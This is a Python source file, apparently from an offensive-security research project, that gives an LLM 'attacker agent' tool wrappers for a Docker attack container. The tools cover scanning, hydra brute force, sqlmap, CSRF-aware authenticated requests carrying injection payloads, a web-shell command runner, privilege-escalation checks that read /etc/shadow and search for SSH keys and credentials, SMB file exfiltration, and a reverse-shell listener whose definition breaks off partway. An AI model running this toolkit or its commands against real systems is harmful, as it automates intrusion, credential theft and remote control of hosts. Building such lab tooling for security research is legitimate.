"""Herramientas de pentesting disponibles para el agente atacante."""

import logging
import os
import re
import shlex

from langchain_core.tools import tool

from src.infrastructure.docker_client import DockerClient

logger = logging.getLogger(__name__)

_docker_instance: DockerClient | None = None


def _docker() -> DockerClient:
    """Lazy-init del cliente Docker: solo se conecta cuando se usa una tool.

    Esto permite importar el modulo sin que Docker este corriendo (util para
    tests, analisis estatico, y para que el sistema arranque limpio si el
    daemon tarda en estar listo).
    """
    global _docker_instance
    if _docker_instance is None:
        _docker_instance = DockerClient()
    return _docker_instance


_SAFE_ID_RE = re.compile(r"[^a-zA-Z0-9_-]")


def _safe_session_id(session_id: str) -> str:
    """Sanitiza session_id para que no pueda hacer path traversal.

    El LLM controla este valor, asi que debe filtrarse: solo letras/digitos/_/-,
    maximo 32 chars. Previene `../../etc/passwd` como session_id.
    """
    cleaned = _SAFE_ID_RE.sub("", session_id or "")[:32]
    return cleaned or "default"


def _safe_tmp_path(prefix: str, session_id: str, suffix: str = "") -> str:
    """Construye path en /tmp con PID + session_id para soportar runs paralelos
    sin que se pisen las cookie jars entre sí.
    """
    clean_id = _safe_session_id(session_id)
    pid = os.getpid()
    return f"/tmp/{prefix}_{pid}_{clean_id}{suffix}"


@tool
def run_nmap(target: str, flags: str = "-sV -sC") -> str:
    """Ejecuta un escaneo nmap contra el objetivo.

    Args:
        target: IP o rango a escanear (ej: "10.10.0.10")
        flags: Flags de nmap (ej: "-sV -sC", "-p-", "-sU --top-ports 100")

    Returns:
        Output del escaneo nmap
    """
    command = f"nmap {flags} {target}"
    result = _docker().exec_in_attacker(command, timeout=180)
    if result.exit_code != 0 and result.stderr:
        return f"Error: {result.stderr}"
    return result.stdout


@tool
def run_hydra_http_form(
    target: str,
    login_path: str,
    user_field: str,
    pass_field: str,
    username: str,
    password_list: str,
    failure_indicator: str,
    extra_form_fields: str = "",
    threads: int = 4,
) -> str:
    """Brute force HTTP POST form login usando hydra.

    Construye automaticamente el modulo http-post-form de hydra con el formato
    correcto. Ideal para atacar formularios de login web (wp-login.php, etc).

    Args:
        target: IP o host del target (ej: "10.10.0.20")
        login_path: Ruta del endpoint de login (ej: "/wp-login.php")
        user_field: Nombre del campo de usuario en el form (ej: "log")
        pass_field: Nombre del campo de password en el form (ej: "pwd")
        username: Usuario a probar (ej: "admin", "elliot")
        password_list: Ruta absoluta al wordlist en el container atacante
        failure_indicator: Substring que aparece en la respuesta cuando el
            login FALLA (ej: "incorrect", "Invalid", "ERROR"). Hydra marca
            una password como correcta cuando esta substring NO aparece.
        extra_form_fields: Campos adicionales del form separados por &
            (ej: "wp-submit=Log+In&testcookie=1"). Opcional.
        threads: Numero de threads paralelos (default 4).

    Returns:
        Output de hydra. Si encuentra credenciales, la linea incluye
        "login: <user>   password: <pass>".
    """
    form_body = f"{user_field}=^USER^&{pass_field}=^PASS^"
    if extra_form_fields:
        form_body += f"&{extra_form_fields}"
    form_module = f"{login_path}:{form_body}:F={failure_indicator}"
    command = (
        f"hydra -l {username} -P {password_list} -t {threads} -f "
        f"{target} http-post-form '{form_module}' 2>&1 | tail -30"
    )
    result = _docker().exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_hydra(
    target: str,
    service: str,
    username: str,
    password_list: str,
    extra_flags: str = "-t 4 -f",
) -> str:
    """Ejecuta hydra contra servicios no-HTTP (ssh, ftp, smb, etc).

    Para HTTP POST form login usa `run_hydra_http_form` que arma el formato
    automaticamente.

    Args:
        target: IP o host del target
        service: Servicio a atacar ("ssh", "ftp", "smb", etc)
        username: Usuario a probar
        password_list: Ruta absoluta al wordlist en el container atacante
        extra_flags: Flags adicionales para hydra (default: -t 4 -f)

    Returns:
        Output de hydra.
    """
    command = (
        f"hydra -l {username} -P {password_list} {extra_flags} "
        f"{target} {service} 2>&1 | tail -30"
    )
    result = _docker().exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_http_session(
    login_url: str,
    login_data: str,
    target_url: str,
    target_method: str = "GET",
    target_data: str = "",
    extra_cookies: str = "",
    session_id: str = "default",
    auto_csrf: bool = True,
) -> str:
    """Flow completo de login HTTP + peticion autenticada con auto-manejo de CSRF.

    Mantiene una cookie jar persistente en /tmp/session_<id>.txt. El flow es:
      1. GET al login_url para obtener PHPSESSID/JSESSIONID y extraer tokens CSRF
         del form (user_token, csrf_token, _token, authenticity_token, etc).
      2. POST login_data (con tokens CSRF inyectados automaticamente si auto_csrf=True).
      3. Si target_method=POST: GET al target_url para obtener tokens CSRF del
         form de destino, luego POST target_data con tokens inyectados.
      4. Si target_method=GET: GET directo al target_url con la sesion.

    Esto permite explotar apps web con CSRF protection (DVWA, WordPress, Drupal)
    sin que tu tengas que orquestar los pasos.

    Args:
        login_url: URL del endpoint de login
        login_data: Body del POST de login (ej: "username=admin&password=admin&Login=Login")
        target_url: URL a acceder con la sesion autenticada
        target_method: Metodo HTTP para target (GET o POST)
        target_data: Body para POST al target (ej: "ip=127.0.0.1;id&Submit=Submit")
        extra_cookies: Cookies extra (ej: "security=low" para DVWA)
        session_id: Identificador para persistir la jar entre llamadas
        auto_csrf: Si True (default), extrae automaticamente tokens CSRF del HTML
            de los form GET y los inyecta en los POSTs.

    Returns:
        Output de la peticion final (headers + body) mas output del login.
    """
    jar = _safe_tmp_path("session", session_id, ".txt")
    tmp_prefix = _safe_tmp_path("httpsession", session_id)
    script_lines = []

    if extra_cookies:
        host = login_url.split("/")[2] if "://" in login_url else login_url.split("/")[0]
        cookies_lines = []
        for c in extra_cookies.split(";"):
            c = c.strip()
            if "=" in c:
                name, value = c.split("=", 1)
                cookies_lines.append(
                    f"{host}\\tFALSE\\t/\\tFALSE\\t0\\t{name.strip()}\\t{value.strip()}"
                )
        if cookies_lines:
            nl = "\\n"
            script_lines.append(
                f"printf '# Netscape HTTP Cookie File{nl}{nl.join(cookies_lines)}{nl}' > {jar}"
            )
    else:
        script_lines.append(f": > {jar}")

    csrf_token_names = "user_token authenticity_token csrf_token _csrf _token token _wpnonce"

    if auto_csrf:
        script_lines.append(
            f"curl -s -c {jar} -b {jar} {shlex.quote(login_url)} -o {tmp_prefix}_login_form.html"
        )
        script_lines.append(
            f"login_tokens=''; "
            f"for name in {csrf_token_names}; do "
            f"  val=$(grep -oE \"name=[\\\"']?$name[\\\"']?[^>]*value=[\\\"'][^\\\"']+\" "
            f"{tmp_prefix}_login_form.html 2>/dev/null | "
            f"grep -oE \"value=[\\\"'][^\\\"']+\" | sed \"s/value=[\\\"']//\" | head -1); "
            f"  [ -n \"$val\" ] && login_tokens=\"$login_tokens&$name=$val\"; "
            f"done"
        )
        login_body_expr = f"{shlex.quote(login_data)}\"$login_tokens\""
    else:
        login_body_expr = shlex.quote(login_data)

    script_lines.append(
        f"echo '=== LOGIN RESPONSE ===' && "
        f"curl -s -i -c {jar} -b {jar} "
        f"-d \"{login_body_expr}\" "
        f"{shlex.quote(login_url)} 2>&1 | head -20"
    )
    script_lines[-1] = script_lines[-1].replace(f'"{login_body_expr}"', login_body_expr if auto_csrf else f'"{login_body_expr}"')

    if target_method.upper() == "POST":
        # URL-encode cada value manualmente para evitar interpretacion shell del ';'
        from urllib.parse import quote as _urlq
        encoded_fields = []
        for field in target_data.split("&"):
            if not field:
                continue
            if "=" in field:
                k, v = field.split("=", 1)
                encoded_fields.append(f"{k}={_urlq(v, safe='')}")
            else:
                encoded_fields.append(field)
        encoded_body = "&".join(encoded_fields)
        body_file = f"{tmp_prefix}_body.txt"
        script_lines.append(f"printf %s {shlex.quote(encoded_body)} > {body_file}")

        if auto_csrf:
            script_lines.append(
                f"curl -s -b {jar} -c {jar} {shlex.quote(target_url)} -o {tmp_prefix}_target_form.html"
            )
            script_lines.append(
                f"for name in {csrf_token_names}; do "
                f"  val=$(grep -oE \"name=[\\\"']?$name[\\\"']?[^>]*value=[\\\"'][^\\\"']+\" "
                f"{tmp_prefix}_target_form.html 2>/dev/null | "
                f"grep -oE \"value=[\\\"'][^\\\"']+\" | sed \"s/value=[\\\"']//\" | head -1); "
                f"  [ -n \"$val\" ] && printf '&%s=%s' \"$name\" \"$val\" >> {body_file}; "
                f"done"
            )
        script_lines.append(
            f"echo '=== TARGET RESPONSE ===' && "
            f"curl -s -i -L -b {jar} -c {jar} "
            f"-X POST --data-binary @{body_file} "
            f"{shlex.quote(target_url)} 2>&1 | head -300"
        )
    else:
        script_lines.append(
            f"echo '=== TARGET RESPONSE ===' && "
            f"curl -s -i -L -b {jar} -c {jar} "
            f"{shlex.quote(target_url)} 2>&1 | head -100"
        )

    command = " ; ".join(script_lines) + f" ; rm -f {tmp_prefix}_*.html 2>/dev/null"
    result = _docker().exec_in_attacker(command, timeout=90)
    return result.stdout or result.stderr


@tool
def run_sqlmap(url: str, extra_flags: str = "--batch --level=2") -> str:
    """Ejecuta sqlmap para detectar y explotar inyecciones SQL.

    Args:
        url: URL vulnerable con parametro inyectable (ej: "http://10.10.0.10/vulnerabilities/sqli/?id=1&Submit=Submit")
        extra_flags: Flags adicionales para sqlmap

    Returns:
        Output de sqlmap con resultados de inyeccion
    """
    command = f"sqlmap -u '{url}' {extra_flags} 2>&1 | tail -60"
    result = _docker().exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_command(command: str) -> str:
    """Ejecuta un comando shell arbitrario en el container atacante o via SSH en el target.

    Esta herramienta es la mas flexible. Se usa para:
    - Ejecucion de comandos tras obtener acceso (Execution, Discovery)
    - Enumeracion del sistema (uname, cat /etc/passwd, etc.)
    - Cualquier comando que no tiene wrapper dedicado

    Args:
        command: Comando bash a ejecutar

    Returns:
        Output del comando (stdout + stderr)
    """
    result = _docker().exec_in_attacker(command, timeout=60)
    output = result.stdout
    if result.stderr:
        output += f"\nSTDERR: {result.stderr}"
    return output


@tool
def run_curl(url: str, method: str = "GET", data: str = "", headers: str = "") -> str:
    """Realiza una peticion HTTP con curl.

    Util para interactuar con aplicaciones web, enviar payloads,
    y verificar endpoints durante Initial Access y Execution.

    Args:
        url: URL completa a consultar
        method: Metodo HTTP (GET, POST, PUT)
        data: Datos para POST/PUT
        headers: Headers adicionales (ej: "Cookie: PHPSESSID=abc123")

    Returns:
        Respuesta HTTP (headers + body)
    """
    cmd_parts = [f"curl -s -i -X {method}"]
    if headers:
        for h in headers.split(";"):
            cmd_parts.append(f"-H '{h.strip()}'")
    if data:
        cmd_parts.append(f"-d '{data}'")
    cmd_parts.append(f"'{url}'")

    command = " ".join(cmd_parts)
    result = _docker().exec_in_attacker(command, timeout=30)
    return result.stdout or result.stderr


@tool
def run_nikto(target: str, flags: str = "-Tuning 3 -maxtime 45s") -> str:
    """Escanea vulnerabilidades web con Nikto.

    El default usa -Tuning 3 (solo Information Disclosure) y -maxtime 45s para
    garantizar que Nikto siempre retorne antes del timeout. Para un scan mas
    completo pasar flags explicitas, pero ten en cuenta que un scan completo
    toma varios minutos y sera truncado.

    Args:
        target: IP o URL del objetivo (ej: "10.10.0.20")
        flags: Flags adicionales para nikto (default: "-Tuning 3 -maxtime 45s")

    Returns:
        Output de nikto con vulnerabilidades y tecnologias encontradas.
        Si nikto timeouta o produce 0 bytes, retorna un mensaje explicito de
        error (NO un string vacio que el LLM pueda confundir con "scan OK").
    """
    command = f"/usr/local/bin/nikto -h {target} {flags} 2>&1 | tail -60"
    result = _docker().exec_in_attacker(command, timeout=75)
    output = result.stdout or result.stderr
    if not output.strip():
        return (
            "[ERROR] nikto no produjo output (exit_code={exit_code}). "
            "Probablemente timeout interno. NO interpretes esto como scan "
            "exitoso — no hay datos. Usa run_gobuster o run_curl para "
            "enumeracion web."
        ).format(exit_code=result.exit_code)
    if result.exit_code == 124:
        return f"[WARN] nikto timeouto parcialmente. Output parcial:\n{output}"
    return output


@tool
def run_gobuster(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", flags: str = "") -> str:
    """Enumera directorios y archivos en un servidor web con gobuster.

    Args:
        url: URL base del objetivo (ej: "http://10.10.0.10")
        wordlist: Ruta al wordlist en el container atacante
            (default: /usr/share/wordlists/dirb/common.txt con ~4600 entradas)
        flags: Flags adicionales para gobuster

    Returns:
        Directorios y archivos encontrados. Output limitado a 80 lineas.
    """
    command = (
        f"gobuster dir -u {url} -w {wordlist} -q {flags} 2>&1 | head -80"
    )
    result = _docker().exec_in_attacker(command, timeout=180)
    output = result.stdout or result.stderr
    if not output.strip():
        return (
            f"(gobuster terminó sin resultados en {url} — ninguna entrada del "
            f"wordlist existe bajo ese path. No insistas con esa URL base; "
            f"verificala primero con run_curl.)"
        )
    return output


@tool
def run_gobuster_recursive(
    url: str,
    max_depth: int = 2,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    extensions: str = "php,html,txt",
) -> str:
    """Enumera directorios de forma recursiva a partir de una URL base.

    Ejecuta gobuster en la URL base, identifica los subdirectorios descubiertos
    (status 301/302 terminados en /) y los vuelve a enumerar hasta max_depth
    niveles. Util para mapear apps web con estructura jerarquica.

    Args:
        url: URL base a enumerar (ej: "http://10.10.0.10")
        max_depth: Profundidad maxima de recursion (default 2)
        wordlist: Ruta al wordlist
        extensions: Extensiones a probar separadas por coma

    Returns:
        Listado agregado de todos los paths encontrados en todos los niveles.
    """
    base_url = url.rstrip("/")
    script = (
        f"url={shlex.quote(base_url)}; "
        f"wl={shlex.quote(wordlist)}; "
        f"ext={shlex.quote(extensions)}; "
        f"depth={max_depth}; "
        f"visited=''; "
        f"queue=\"$url\"; "
        f"out=''; "
        f"for level in $(seq 1 $depth); do "
        f"  next=''; "
        f"  for target in $queue; do "
        f"    case \"$visited\" in *\"|$target|\"*) continue ;; esac; "
        f"    visited=\"$visited|$target|\"; "
        f"    out=\"$out\n=== $target ===\n\"; "
        f"    result=$(gobuster dir -u \"$target\" -w \"$wl\" -x \"$ext\" -q --no-error 2>/dev/null | head -40); "
        f"    out=\"$out$result\n\"; "
        f"    echo \"$result\" | grep -E 'Status: (301|302)' | grep -oE '/[a-zA-Z0-9_./\\-]+' | while read sub; do "
        f"      full=\"$target$sub\"; "
        f"      case \"$full\" in */) full=\"${{full%/}}\" ;; esac; "
        f"      next=\"$next $full\"; "
        f"    done; "
        f"  done; "
        f"  queue=\"$next\"; "
        f"  [ -z \"$queue\" ] && break; "
        f"done; "
        f"echo \"$out\" | head -200"
    )
    result = _docker().exec_in_attacker(script, timeout=360)
    return result.stdout or result.stderr


@tool
def run_spider(
    url: str,
    cookies: str = "",
    max_pages: int = 25,
) -> str:
    """Crawlea paginas HTML siguiendo enlaces internos (a href) recursivamente.

    Util para mapear apps web autenticadas cuyo contenido no aparece en
    wordlists: se loguea con cookies y sigue los enlaces del sitio.

    Args:
        url: URL inicial a crawlear
        cookies: Cookies de sesion (formato: "name=value; name2=value2")
        max_pages: Numero maximo de paginas a fetchear

    Returns:
        Lista de URLs encontradas junto con titulos y forms detectados.
    """
    cookie_arg = f"-b '{cookies}'" if cookies else ""
    host = url.split("/")[2] if "://" in url else url.split("/")[0]
    script = f"""
set -e
base={shlex.quote(url)}
host={shlex.quote(host)}
cookies={shlex.quote(cookies)}
max={max_pages}
visited=/tmp/spider_visited.$$
queue=/tmp/spider_queue.$$
out=/tmp/spider_out.$$
: > "$visited"
echo "$base" > "$queue"
: > "$out"
count=0
while [ -s "$queue" ] && [ "$count" -lt "$max" ]; do
  url=$(head -n1 "$queue")
  sed -i '1d' "$queue"
  case "$(grep -Fx "$url" "$visited")" in "$url") continue ;; esac
  echo "$url" >> "$visited"
  count=$((count+1))
  if [ -n "$cookies" ]; then
    body=$(curl -s -L -b "$cookies" -o /dev/stdout -w "\\nHTTP %{{http_code}}\\n" "$url" 2>/dev/null)
  else
    body=$(curl -s -L -o /dev/stdout -w "\\nHTTP %{{http_code}}\\n" "$url" 2>/dev/null)
  fi
  status=$(echo "$body" | tail -n1)
  title=$(echo "$body" | grep -oE '<title>[^<]*</title>' | head -1 | sed 's/<[^>]*>//g')
  forms=$(echo "$body" | grep -oE '<form[^>]*>' | head -3)
  echo "[$status] $url  ${{title:-(no title)}}" >> "$out"
  if [ -n "$forms" ]; then
    echo "  FORMS: $forms" >> "$out"
  fi
  echo "$body" | grep -oE 'href="[^"]+"' | sed 's/href="//;s/"$//' | while read link; do
    case "$link" in
      http*//"$host"*) full="$link" ;;
      http*) continue ;;
      /*) full="http://$host$link" ;;
      \\#*) continue ;;
      ?*) base_dir=$(dirname "$url"); full="$base_dir/$link" ;;
      *) continue ;;
    esac
    case "$full" in *\\?*) full=$(echo "$full" | cut -d'?' -f1) ;; esac
    if ! grep -Fxq "$full" "$visited" && ! grep -Fxq "$full" "$queue"; then
      echo "$full" >> "$queue"
    fi
  done
done
cat "$out"
rm -f "$visited" "$queue" "$out"
"""
    result = _docker().exec_in_attacker(script, timeout=180)
    return result.stdout or result.stderr


@tool
def run_wpscan(url: str, flags: str = "--enumerate u --disable-tls-checks") -> str:
    """Escanea un sitio WordPress con WPScan para enumerar usuarios y vulnerabilidades.

    Args:
        url: URL del sitio WordPress (ej: "http://10.10.0.20")
        flags: Flags adicionales de wpscan

    Returns:
        Output de wpscan con usuarios, plugins y vulnerabilidades
    """
    command = f"wpscan --url {url} {flags} 2>&1 | tail -80"
    result = _docker().exec_in_attacker(command, timeout=180)
    return result.stdout or result.stderr


@tool
def run_web_shell(cmd: str, url: str) -> str:
    """Ejecuta un comando en el target via webshell PHP desplegada durante Execution.

    No hay URL por defecto: el agente debe pasar la URL exacta de la webshell que
    desplegó previamente (ej: http://<target>/ruta/al/archivo.php). Si no tienes
    una webshell desplegada aún, primero completa Execution.

    Args:
        cmd: Comando shell a ejecutar en el servidor target
        url: URL completa de la webshell (incluyendo esquema http:// y path)

    Returns:
        Output del comando ejecutado en el target
    """
    import urllib.parse
    # El LLM a veces pasa url con ?cmd=... ya incluido; descomponemos y
    # reescribimos el query para evitar duplicados tipo index.php?cmd=id?cmd=id.
    parts = urllib.parse.urlsplit(url)
    query_params = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    query_params["cmd"] = cmd
    rebuilt = urllib.parse.urlunsplit((
        parts.scheme, parts.netloc, parts.path,
        urllib.parse.urlencode(query_params), parts.fragment,
    ))
    request_cmd = f"curl -s '{rebuilt}'"
    result = _docker().exec_in_attacker(request_cmd, timeout=30)
    return result.stdout or result.stderr


@tool
def run_john(
    hash_content: str,
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
    hash_format: str = "raw-md5",
) -> str:
    """Crack hashes de contrasena con John the Ripper.

    Args:
        hash_content: Hash en formato john (ej: "robot:c3fcd3d76192e4007dfb496cca67e13b").
            Puede incluir user:hash o solo hash. Multiple hashes separados por newline.
        wordlist: Ruta absoluta al wordlist en el container atacante.
            Defaults: /usr/share/wordlists/rockyou.txt (muy grande, lento pero cubre mucho),
            /opt/wordlists/*.txt (wordlists descubiertas en el target), o una ruta custom.
        hash_format: Formato del hash. Valores comunes: raw-md5, raw-sha1, raw-sha256,
            sha512crypt (/etc/shadow $6$), md5crypt ($1$), bcrypt ($2a$), phpass (wordpress).
            "auto" deja que john detecte (menos preciso pero universal).

    Returns:
        Contrasena crackeada o output de john.
    """
    import os as _os
    pid = _os.getpid()
    hash_file = f"/tmp/hash_crack_{pid}.txt"

    # Sanitiza hash_format (solo letras/digitos/guion) para evitar inyeccion.
    safe_format = re.sub(r"[^a-zA-Z0-9-]", "", hash_format) or "raw-md5"
    format_flag = "" if safe_format == "auto" else f"--format={safe_format}"

    # Usa printf + shlex.quote para escapar el hash (el LLM controla el contenido).
    # stdin redirect evita problemas con $ y otros caracteres shell.
    quoted_hash = shlex.quote(hash_content)
    quoted_wordlist = shlex.quote(wordlist)
    commands = [
        f"printf %s {quoted_hash} > {hash_file}",
        f"john {format_flag} --wordlist={quoted_wordlist} {hash_file} 2>&1",
        f"john --show {format_flag} {hash_file} 2>&1",
    ]
    command = " ; ".join(commands) + f" ; rm -f {hash_file}"
    result = _docker().exec_in_attacker(command, timeout=90)
    return result.stdout or result.stderr


@tool
def run_searchsploit(query: str, flags: str = "--exact") -> str:
    """Busca exploits publicos en la base de ExploitDB local.

    Equivalente a la funcion "busqueda de CVE" que un pentester humano hace tras
    identificar una version de software vulnerable. Ref: ExploitDB mantenido
    por Offensive Security; searchsploit es la CLI oficial.

    Uso tipico: tras detectar "Apache 2.4.49" o "vsftpd 2.3.4", correr
    run_searchsploit("Apache 2.4.49") o run_searchsploit("vsftpd 2.3.4") para
    obtener lista de exploits disponibles con path al script PoC.

    Args:
        query: Termino de busqueda (nombre del software + version preferible).
            Ej: "Apache Struts 2.3.31", "log4j 2.14", "wordpress 4.7".
        flags: Flags adicionales (--exact, --cve CVE-2021-44228, -w para URL).

    Returns:
        Tabla de exploits encontrados con path local al script.
    """
    q = shlex.quote(query)
    command = f"searchsploit {flags} {q} 2>&1 | head -60"
    result = _docker().exec_in_attacker(command, timeout=30)
    output = result.stdout or result.stderr
    if not output.strip() or "Exploits: No Results" in output:
        return f"[INFO] searchsploit no encontro exploits para '{query}'. Prueba query mas generico."
    return output


@tool
def run_enum4linux(target: str, flags: str = "-a") -> str:
    """Enumera recursos SMB/NetBIOS expuestos por el target.

    Ref: enum4linux-ng (rewrite Python de enum4linux original de Mark Lowe),
    usado extensivamente en OSCP y reportado como tool clave en Cybench 2025.
    Extrae usuarios, grupos, shares, password policy, y info del dominio cuando
    hay SMB (puerto 445) o NetBIOS (137-139) expuestos.

    Args:
        target: IP del target con SMB expuesto.
        flags: Flags enum4linux. Default -a (all). Otras: -U (users),
            -S (shares), -G (groups), -P (password policy).

    Returns:
        Output estructurado con shares, users, groups, sessions.
    """
    command = f"enum4linux {flags} {shlex.quote(target)} 2>&1 | tail -150"
    result = _docker().exec_in_attacker(command, timeout=90)
    output = result.stdout or result.stderr
    if not output.strip():
        return f"[INFO] enum4linux sin output para {target}. Verifica que puerto 445 este abierto con run_nmap."
    return output


@tool
def run_smbclient(
    target: str,
    share: str = "",
    username: str = "",
    password: str = "",
    command: str = "ls",
) -> str:
    """Interactua con shares SMB: lista o ejecuta un comando smb.

    Si share='' hace listado de shares (`smbclient -L`). Si share='<name>'
    ejecuta `command` dentro del share. Util para exfiltrar archivos de shares
    anonimos o con credenciales descubiertas en enumeracion.

    Args:
        target: IP del servidor SMB.
        share: Nombre del share (vacio para listar).
        username: Usuario (puede ser vacio para acceso anonimo).
        password: Password (puede ser vacio).
        command: Comando smb a ejecutar (ej: "ls", "get archivo.txt",
            "recurse;prompt;mget *").

    Returns:
        Output de smbclient.
    """
    auth = ""
    if username:
        auth = f"-U {shlex.quote(username)}%{shlex.quote(password)}"
    else:
        auth = "-N"  # anonymous

    if not share:
        cmd = f"smbclient -L //{shlex.quote(target)}/ {auth} 2>&1 | head -60"
    else:
        q_share = shlex.quote(share)
        q_cmd = shlex.quote(command)
        cmd = f"smbclient //{shlex.quote(target)}/{q_share} {auth} -c {q_cmd} 2>&1 | head -80"
    result = _docker().exec_in_attacker(cmd, timeout=45)
    return result.stdout or result.stderr


@tool
def run_ssh_exec(
    target: str,
    username: str,
    password: str,
    remote_command: str,
    port: int = 22,
) -> str:
    """Ejecuta un comando via SSH en el target usando credenciales descubiertas.

    Util post-Initial-Access cuando se obtuvieron credenciales SSH (por hydra,
    por archivos, por reuse de passwords). Usa sshpass para auto-autenticarse
    con password. Para llaves privadas usar run_command directamente.

    Args:
        target: IP o hostname.
        username: Usuario SSH.
        password: Password SSH.
        remote_command: Comando a ejecutar en el target.
        port: Puerto SSH (default 22).

    Returns:
        stdout/stderr del comando ejecutado remotamente.
    """
    q_pass = shlex.quote(password)
    q_user = shlex.quote(username)
    q_target = shlex.quote(target)
    q_cmd = shlex.quote(remote_command)
    ssh_flags = (
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=/dev/null "
        "-o ConnectTimeout=10 "
        f"-p {int(port)}"
    )
    command = (
        f"sshpass -p {q_pass} ssh {ssh_flags} {q_user}@{q_target} {q_cmd} 2>&1"
    )
    result = _docker().exec_in_attacker(command, timeout=60)
    return result.stdout or result.stderr


@tool
def run_ftp(
    target: str,
    username: str = "anonymous",
    password: str = "anonymous@",
    commands: str = "ls",
    port: int = 21,
) -> str:
    """Interactua con servidor FTP via autenticacion + secuencia de comandos.

    Ideal para explorar FTP anonymous (muy comun en CTFs) o FTP con credenciales
    descubiertas. Autentica, ejecuta `commands` (separados por ';') y cierra.

    Args:
        target: IP del servidor FTP.
        username: Usuario (default 'anonymous').
        password: Password (default 'anonymous@').
        commands: Comandos ftp separados por ';'. Ej: "ls; pwd; get secret.txt".
        port: Puerto FTP (default 21).

    Returns:
        Output completo de la sesion FTP.
    """
    cmds = ";".join(c.strip() for c in commands.split(";") if c.strip())
    # Script que envia por stdin a ftp -n (sin auto-login).
    script = (
        f"(echo open {shlex.quote(target)} {int(port)}; "
        f"echo user {shlex.quote(username)} {shlex.quote(password)}; "
        f"for c in {cmds}; do echo \"$c\"; done; "
        f"echo bye) | ftp -n -v 2>&1 | head -80"
    )
    result = _docker().exec_in_attacker(script, timeout=45)
    return result.stdout or result.stderr


@tool
def run_dns_enum(target: str, record_types: str = "A,NS,MX,TXT,SOA") -> str:
    """Enumera DNS del target: registros, transferencia de zona, subdominios.

    Ejecuta secuencia de dig/nslookup con multiples tipos de registro. Util
    cuando el target es un dominio (no solo IP) o cuando se sospecha de DNS
    mal configurado (AXFR abierto).

    Args:
        target: Dominio o IP (si IP, intenta reverse DNS).
        record_types: Tipos de registro separados por coma. Default: A,NS,MX,TXT,SOA.

    Returns:
        Output de digs multiples + intento de AXFR.
    """
    types = [t.strip() for t in record_types.split(",") if t.strip()][:10]
    q_target = shlex.quote(target)
    lines = []
    for rt in types:
        safe_rt = re.sub(r"[^A-Z]", "", rt.upper()) or "A"
        lines.append(f"echo '=== {safe_rt} ==='; dig +short {safe_rt} {q_target} 2>&1")
    lines.append(f"echo '=== AXFR (zone transfer) ==='; dig AXFR {q_target} 2>&1 | head -20")
    lines.append(f"echo '=== NS records ==='; dig +short NS {q_target} 2>&1")
    lines.append(f"echo '=== reverse ==='; dig -x {q_target} +short 2>&1")
    command = " ; ".join(lines)
    result = _docker().exec_in_attacker(command, timeout=30)
    return result.stdout or result.stderr


@tool
def run_priv_esc_enum(webshell_url: str, mode: str = "quick") -> str:
    """Ejecuta enumeracion de privilege escalation via webshell.

    Corre una secuencia curada de comandos que cubren los vectores mas comunes
    de priv-esc en Linux (ref: GTFOBins, HackTricks, LinPEAS). No descarga
    archivos externos: ejecuta todo in-place para mantener la huella minima.

    Args:
        webshell_url: URL de la webshell activa.
        mode: 'quick' (basicos ~10 comandos), 'full' (~30 comandos con file
            enumeration), 'suid' (solo SUID/SGID/capabilities).

    Returns:
        Output combinado de todas las checks de priv-esc.
    """
    import urllib.parse
    mode = mode.lower().strip()
    if mode == "suid":
        checks = [
            "find / -perm -u=s -type f 2>/dev/null",
            "find / -perm -g=s -type f 2>/dev/null",
            "getcap -r / 2>/dev/null",
        ]
    elif mode == "full":
        checks = [
            "id; hostname; uname -a",
            "sudo -l 2>&1",
            "cat /etc/sudoers 2>/dev/null",
            "find / -perm -u=s -type f 2>/dev/null | head -40",
            "find / -perm -g=s -type f 2>/dev/null | head -40",
            "getcap -r / 2>/dev/null | head -20",
            "ls -la /root/ 2>/dev/null",
            "cat /etc/shadow 2>&1 | head -5",
            "cat /etc/crontab 2>/dev/null",
            "ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null",
            "cat /etc/passwd 2>/dev/null",
            "ls -la /home 2>/dev/null",
            "find /home -name '.ssh' -type d 2>/dev/null",
            "find / -name '*.kdbx' -o -name 'id_rsa' -o -name '.git-credentials' 2>/dev/null",
            "env 2>/dev/null",
            "cat /proc/version; lsb_release -a 2>/dev/null",
            "ps aux | head -30",
            "netstat -antlp 2>/dev/null | head -20",
            "find / -writable -type d 2>/dev/null | head -20",
            "find / -name '*.conf' -exec grep -l 'password\\|pass\\|pwd' {} \\; 2>/dev/null | head -10",
        ]
    else:
        checks = [
            "id; whoami; hostname",
            "uname -a",
            "cat /etc/passwd 2>/dev/null",
            "sudo -l 2>&1",
            "find / -perm -u=s -type f 2>/dev/null | head -20",
            "getcap -r / 2>/dev/null | head -10",
            "ls -la /root/ 2>/dev/null",
            "cat /etc/crontab 2>/dev/null",
            "ls -la /home 2>/dev/null",
        ]

    # Separador explicito entre outputs para parseo mas facil
    combined = []
    for cmd in checks:
        marker = f"===== {cmd[:60]} ====="
        combined.append(f"echo '{marker}'; {cmd}; echo")
    script = " ; ".join(combined)
    encoded = urllib.parse.quote(script)

    parts = urllib.parse.urlsplit(webshell_url)
    query_params = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
    query_params["cmd"] = script
    rebuilt = urllib.parse.urlunsplit((
        parts.scheme, parts.netloc, parts.path,
        urllib.parse.urlencode(query_params), parts.fragment,
    ))
    cmd = f"curl -s --max-time 60 {shlex.quote(rebuilt)}"
    result = _docker().exec_in_attacker(cmd, timeout=75)
    return result.stdout or result.stderr


@tool
def start_reverse_listener(port: int = 4444, timeout_seconds: int = 60) -> str:
    """Arranca un listener netcat en background para recibir reverse shells.

    Tras invocar, el listener corre en el contenedor atacante en 0.0.0.0:<port>.
    Usa esta tool antes de disparar un payload de reverse shell desde el target.
    El output se escribe a /tmp/listener_<port>.log que puedes leer con
    run_command('cat /tmp/listener_<port>.log').

    Args:
        port: Puerto donde escuchar. Default 4444.
        timeout_seconds: Segundos que estara activo el listener. Default 60.

    Returns:
        Confirmacion de arranque con path del log.
    """
    port = int(port)
    if port < 1024 or port > 65535:
        return f"[ERROR] Puerto fuera de rango: {port}. Usa 1024-65535."
    log = f"/tmp/listener_{port}.log"
